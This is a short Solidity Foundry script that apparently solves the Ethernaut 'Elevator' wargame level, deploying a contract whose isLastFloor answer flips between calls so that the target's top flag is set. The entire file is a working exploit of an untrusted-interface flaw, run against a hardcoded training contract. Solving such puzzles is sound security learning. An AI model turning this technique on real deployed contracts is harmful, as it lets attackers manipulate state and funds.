pragma solidity ^0.8.0;

import "../src/level11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuilding {
    bool private check = true;
    Elevator ins = Elevator(0x0f14a43705aD438eCF1020b795B6c565aE676fA6);

    // constructor() {
    //     Elevator ins = Elevator(0x0f14a43705aD438eCF1020b795B6c565aE676fA6);
    //     ins.goTo(1);
    // }
    function attack() public {
        ins.goTo(1);
        console.log(ins.top()); 
    }

    function isLastFloor(uint256 floor) external returns (bool){
        if (check) {
            check = false;
            return false;
        } else {
            return true;
        }
    }
}

contract Solution is Script {

    // Elevator public ins = Elevator(0x0f14a43705aD438eCF1020b795B6c565aE676fA6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding a = new MyBuilding();
        a.attack();
        vm.stopBroadcast();
    }
}